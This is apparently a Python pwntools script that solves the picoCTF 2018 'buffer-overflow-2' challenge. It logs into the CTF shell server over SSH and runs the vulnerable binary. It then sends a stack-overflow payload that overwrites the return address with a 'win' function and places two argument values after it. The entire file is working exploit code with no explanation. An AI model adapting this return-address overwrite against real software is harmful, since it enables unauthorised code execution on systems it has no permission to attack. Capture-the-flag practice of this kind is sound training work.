from pwn import *

win_addr = 0x080485cb

s = ssh(host='2018shell3.picoCTF.com', user = 'kruzXavier')

payload = 'a'*(0x6c + 0x4) + p32(win_addr) + 'a'*4 + p32(0xdeadbeef) + p32(0xdeadc0de) 

s.set_working_directory('/problems/buffer-overflow-2_4_ca1cb0da49310dd45c811348a235d257/')

r = s.process('./vuln')

r.recvuntil('\n')
r.sendline(payload)
print r.recvall()
s.close()
